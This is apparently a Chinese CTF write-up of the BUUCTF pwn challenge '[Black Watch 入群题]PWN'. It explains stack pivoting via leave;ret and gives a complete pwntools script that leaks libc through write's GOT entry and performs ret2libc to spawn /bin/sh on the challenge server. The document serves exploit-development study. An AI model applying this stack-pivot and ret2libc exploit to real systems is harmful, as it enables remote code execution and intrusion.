---
title: "BUUCTF Pwn [Black Watch 入群题]PWN"
date: 2020-04-01T21:56:14+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

## [Black Watch 入群题]PWN

考点

1、栈溢出和栈迁移

2、leak

栈迁移主要利用leave；ret指令来完成，首先要明确esp和ebp这个两个寄存器确定一个栈空间

esp指向栈顶，ebp指向栈底，eip寄存器指向即将执行的指令，每执行完一条指令后eip都会改变指向下一条指令

leave  <=>  mov  esp,ebp;

​					pop   ebp; 将esp栈顶所指的内容赋给ebp

ret      <=>   pop  eip;  将esp栈顶所指的内容赋给eip

以上的pop指令是将当前esp栈顶所指向的数据赋给指定的寄存器，并且把esp+4

栈迁移，意味着调用函数将被掉函数的栈迁移到其他区域如bss或者data，需要RW权限，若有X权限则可以直接写入shellcode然后通过栈溢出ret到此shellcode执行

![image-20200402003117210](/images/image-20200402003117210.png)

![image-20200402003331737](/images/image-20200402003331737.png)

![image-20200402003355101](/images/image-20200402003355101.png)

本题先通过第一个read函数读入我们伪造的栈帧到bss，然后再用第二个read函数造成栈溢出同时执行栈迁移操作将栈迁移到伪造好栈数据的bss段执行，这里的bss只有读写权限没有执行权限，但是它只是作为一个栈存数据所以不影响我们的操作

![image-20200402004013574](/images/image-20200402004013574.png)

栈迁移实际是利用到这个retn之前的leave和我们溢出后构造的leave来执行栈迁移，首先要明确执行一个call的时候会将call的下一条指令push入栈中也就是在栈溢出中需要覆盖的retn地址，然后再将原调函数的ebp也push进栈，为了栈还原做准备，将执行call的函数的ebp保存进栈当执行完这个call之后就可以同通过这个保存的ebp找回原调函数的栈继续执行

具体流程：

1、通过栈溢出将ebp覆盖为我们栈迁移的目标地址，这样在执行到leave的时候就会讲esp指向这个被覆盖的ebp的位置(mov esp,ebp)，然后pop ebp；将我们覆盖掉的ebp存的地址作为栈底，这样栈底首先被迁移到目标地址了

2、将retn覆盖为leave；ret；这个gadget，这样在ret之前还会之前还会执行一遍leave(mov esp,ebp;pop ebp)，这个时候的esp和ebp指向的位置都是栈迁移目标地址也就是程序中s的地址，实际上在本题中第二次leave中的pop ebp是多余的，还会使我们esp+4所以我们在覆盖ebp的时候可以覆盖为目标地址s-4的地址处这样在执行pop ebp的时候esp+4-4就抵消了，最后执行ret也就是pop eip将当前esp所指的内容赋给eip，这样程序下次执行的就是伪造在bss段中存的函数地址

![image-20200402013952656](/images/image-20200402013952656.png)

```python
from pwn import *
context.log_level = 'debug'
#sh = process('./spwn')
sh = remote('node3.buuoj.cn',27349)
elf = ELF('./spwn')
libc = ELF('./x86_ubuntu16_libc-2.23.so')

bss_addr = 0x0804a300 #也就是s的地址
leave_ret = 0x08048408 #gadget

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
#第一轮执行leak出write地址来计算libc
payload = p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
sh.sendafter("name?",payload)
payload = 'a'*0x18 + p32(bss_addr-0x4) + p32(leave_ret)
sh.sendafter("say?",payload)
#接收leak
libc_write = u32(sh.recv(4))
#计算基地址、system()地址、字符串/bin/sh地址
libc_base = libc_write - libc.symbols['write']
system_addr = libc.symbols['system'] + libc_base
binsh_addr = libc.search('/bin/sh').next() + libc_base
#第二轮执行栈溢出ret2libc
payload = p32(system_addr) + p32(main_addr) + p32(binsh_addr)
sh.sendafter("name?",payload)
payload = 'a'*0x18 + p32(bss_addr-0x4) + p32(leave_ret)
sh.sendafter("say?",payload)
sh.interactive()
```

![image-20200402014503258](/images/image-20200402014503258.png)